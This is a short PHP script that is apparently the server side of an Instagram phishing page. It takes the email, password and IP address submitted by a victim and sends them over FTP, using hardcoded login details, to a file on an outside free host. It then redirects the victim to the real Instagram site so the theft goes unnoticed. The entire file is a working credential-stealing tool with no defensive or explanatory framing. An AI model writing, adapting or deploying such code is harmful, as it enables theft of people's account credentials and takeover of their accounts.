<?php

$correof = $_POST[ 'correof' ];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("ftp://capturasinsta:acceso20@files.000webhost.com/public_html/index.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#EE0707">'.$correof.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fclose($f);
sleep(2);
header("Location: https://www.instagram.com");
?>

